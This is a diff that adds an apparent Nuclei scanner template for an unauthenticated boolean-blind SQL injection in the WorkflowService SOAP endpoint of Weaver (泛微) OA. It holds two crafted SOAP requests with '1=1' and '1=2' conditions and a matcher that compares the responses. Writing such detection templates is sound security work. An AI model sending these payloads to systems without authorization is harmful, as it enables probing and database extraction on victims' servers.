@@ -1,0 +1,72 @@
+id: weaver-oa-workflowservice-sqli
+
+info:
+  name: 泛微OA WorkflowService SQL注入漏洞（未授权）
+  author: security-researcher
+  severity: high
+  description: 泛微OA的WorkflowService接口存在SQL注入漏洞，未经身份验证的攻击者可通过构造SOAP请求进行布尔盲注，获取数据库信息。
+  tags: sqli,unauth,weaver
+
+http:
+  - raw:
+      - |
+        POST /services/WorkflowService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "urn:weaver.workflow.webservices.WorkflowService.getDoingWorkflowRequestCount"
+        Content-Type: text/xml; charset=utf-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ws="webservices.services.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <ws:getDoingWorkflowRequestCount>
+              <ws:in0>1</ws:in0>
+              <ws:in1>
+                <ws:string>1=1</ws:string>
+              </ws:in1>
+              <ws:in2>false</ws:in2>
+            </ws:getDoingWorkflowRequestCount>
+          </soapenv:Body>
+        </soapenv:Envelope>
+      - |
+        POST /services/WorkflowService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "urn:weaver.workflow.webservices.WorkflowService.getDoingWorkflowRequestCount"
+        Content-Type: text/xml; charset=utf-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ws="webservices.services.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <ws:getDoingWorkflowRequestCount>
+              <ws:in0>1</ws:in0>
+              <ws:in1>
+                <ws:string>1=2</ws:string>
+              </ws:in1>
+              <ws:in2>false</ws:in2>
+            </ws:getDoingWorkflowRequestCount>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    extractors:
+      - type: regex
+        name: out1
+        part: body
+        group: 1
+        regex:
+          - '<ns1:out>(\d+)</ns1:out>'
+        internal: true
+      - type: regex
+        name: out2
+        part: body
+        group: 1
+        regex:
+          - '<ns1:out>(\d+)</ns1:out>'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'int(out1_1) > 0 && int(out2_2) == 0'
+        condition: and
+
+flow: http(1) && http(2)
